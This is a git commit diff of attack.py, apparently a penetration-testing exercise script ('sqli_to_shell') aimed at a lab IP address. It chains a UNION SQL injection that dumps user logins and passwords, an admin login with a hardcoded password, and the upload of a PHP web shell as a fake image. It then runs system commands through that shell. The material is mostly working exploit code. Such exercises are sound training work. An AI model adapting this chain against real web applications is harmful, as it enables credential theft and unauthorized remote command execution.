cc99b1457869f0501529d6e7aa67d7990aae6430
Nyanyi <yprentis@gmail.com>
2020-10-20 18:04:17 +0200

    Update attack.py

--- exercices/sqli_to_shell/attack.py
+++ exercices/sqli_to_shell/attack.py
@@ -1,43 +1,37 @@
 import requests
 
+## Configuration
 target="172.16.113.159"
+url="http://" + target
 path_file="/home/nyanyi/awae/preparacion/sqli_to_shell/solucion/console.php3"
-command='uname -a'
+url_admin= url + "/admin/index.php"
+command='uname -a; id'
 
 def sqli():
-    path_sqli="/cat.php"
-    url = "http://" + target + path_sqli
+    url_sqli = url + "/cat.php"
     payload = {'id':"2 UNION SELECT NULL,concat_ws(' : ' ,id,login,password),NULL,NULL FROM photoblog.users"}
-    r=requests.get(url, params=payload, verify=False)
+    r=requests.get(url_sqli, params=payload, verify=False)
     print(r.text)
 
 
 def login():
-    path="/admin/index.php"
-    url="http://" + target + path
     payload={'user':'admin', 'password':'P4ssw0rd'}
-    r=requests.post(url, data=payload, verify=False)
+    r=requests.post(url_admin, data=payload, verify=False)
     print(r.status_code)
     return(r.cookies['PHPSESSID'])
 
 
 def file_upload(idcookies):
-    path="/admin/index.php"
-    url = "http://" + target + path
     payload = {'title':"hpl", 'category':'1', 'Add':'Add'}
     files={'image':('lovecraft.php3',open(path_file,'rb'),'application/x-php')}
     cookies=dict(PHPSESSID=idcookies)
-    requests.post(url, files=files, data=payload, cookies=cookies, verify=False)
+    requests.post(url_admin, files=files, data=payload, cookies=cookies, verify=False)
 
 def remote_console():
-    path="/admin/uploads/lovecraft"
-    url = "http://" + target + path
+    url_path_console = url + "/admin/uploads/lovecraft"
     payload = {'cmd':command}
-    r=requests.get(url, params=payload, verify=False)
+    r=requests.get(url_path_console, params=payload, verify=False)
     print(r.text)
-
-	
-#start
 
 if __name__=='__main__':
     sqli()
